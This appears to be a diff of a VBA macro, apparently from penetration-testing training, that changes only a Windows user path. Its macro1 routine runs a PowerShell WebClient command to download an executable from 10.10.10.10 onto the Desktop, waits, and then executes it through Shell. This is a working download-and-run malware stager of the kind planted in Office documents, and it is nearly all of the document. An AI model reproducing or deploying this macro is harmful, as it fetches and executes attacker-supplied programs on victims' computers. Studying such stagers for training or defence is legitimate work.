@@ -31,11 +31,11 @@ End Sub
 
 Sub macro1()
     Dim str As String
-    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/winout64.exe', 'C:\Users\Offsec\Desktop\winsysx64.exe')"
+    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/winout64.exe', 'C:\Users\awhole\Desktop\winsysx64.exe')"
     Shell str, 1
     Wait (10)
     Dim RetVal
-    RetVal = Shell("C:\Users\Offsec\Desktop\winsysx64.exe", 1)
+    RetVal = Shell("C:\Users\awhole\Desktop\winsysx64.exe", 1)
 End Sub
 
 Sub Wait(n As Long)
